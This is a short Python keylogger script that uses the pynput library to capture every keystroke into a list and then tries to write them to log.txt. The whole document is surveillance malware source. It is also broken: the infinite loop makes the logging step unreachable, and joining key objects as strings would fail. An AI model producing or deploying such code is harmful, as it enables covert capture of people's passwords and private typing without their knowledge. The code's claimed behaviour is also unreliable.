```python
from pynput import keyboard

# Create a list to store the keystrokes
keystrokes = []

# Define a function to capture each keystroke
def on_press(key):
    keystrokes.append(key)

# Create a listener object
listener = keyboard.Listener(on_press=on_press)

# Start listening for keystrokes
listener.start()

# Run the code indefinitely
while True:
    pass

# Stop listening for keystrokes
listener.stop()

# Write the keystrokes to a text file
with open('log.txt', 'w') as f:
    f.write(''.join(keystrokes))
```